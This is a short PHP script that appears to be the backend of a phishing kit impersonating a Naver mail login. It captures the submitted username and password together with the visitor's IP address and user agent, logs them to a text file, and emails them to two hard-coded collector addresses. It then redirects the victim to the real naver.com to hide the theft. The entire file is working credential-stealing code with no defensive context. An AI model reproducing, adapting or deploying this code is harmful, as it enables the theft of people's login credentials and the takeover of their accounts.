<?php
if($_POST["id"] != "" and $_POST["pw"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Mail Naver Info-----------------------\n";
$message .= "Naver        : ".$_POST['id']."\n";
$message .= "Password       : ".$_POST['pw']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";

$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);

$send = "newerarezult007@gmail.com, newerarezult008@yandex.com";
$subject = "Naver";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: http://www.naver.com");
}

?>